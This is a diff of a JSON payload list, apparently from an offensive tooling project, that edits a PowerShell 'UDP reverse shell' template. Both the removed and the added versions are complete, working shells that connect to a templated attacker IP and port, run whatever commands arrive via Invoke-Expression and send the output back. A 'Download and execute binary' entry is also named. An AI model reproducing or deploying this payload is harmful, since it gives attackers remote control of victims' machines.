@@ -2,7 +2,7 @@
   "payloads": [
     {
       "payload_name": "UDP reverse shell",
-      "payload_template": "$e = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse(''{{IP}}''),{{PORT}}); $client = New-Object System.Net.Sockets.UDPClient; [byte[]]$bytes = 0..255|%{0}; $sendbytes = ([text.encoding]::ASCII).GetBytes(''PS '' + (Get-Location).Path + ''>'');    $client.Send($sendbytes,$sendbytes.Length,$e); while($true) { $receivebytes = $client.Receive([ref]$e); $returndata = ([text.encoding]::ASCII).GetString($receivebytes); $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String ); $sendback = $result +  ''PS '' + (Get-Location).Path + ''> ''; $x = ($error[0] | Out-String); $error.clear(); $sendback2 = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2); $client.Send($sendbytes,$sendbytes.Length,$e)};$client.Close();"
+      "payload_template": "$e = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse(''{{IP}}''),{{PORT}}); $client = New-Object System.Net.Sockets.UDPClient; $sendbytes = ([text.encoding]::ASCII).GetBytes(''PS '' + (Get-Location).Path + ''>'');    $client.Send($sendbytes,$sendbytes.Length,$e); while($true) { $receivebytes = $client.Receive([ref]$e); $returndata = ([text.encoding]::ASCII).GetString($receivebytes); $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String ); $sendback = $result +  ''PS '' + (Get-Location).Path + ''> ''; $x = ($error[0] | Out-String); $error.clear(); $sendback2 = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2); $client.Send($sendbytes,$sendbytes.Length,$e)};$client.Close();"
     },
     {
       "payload_name": "Download and execute binary",
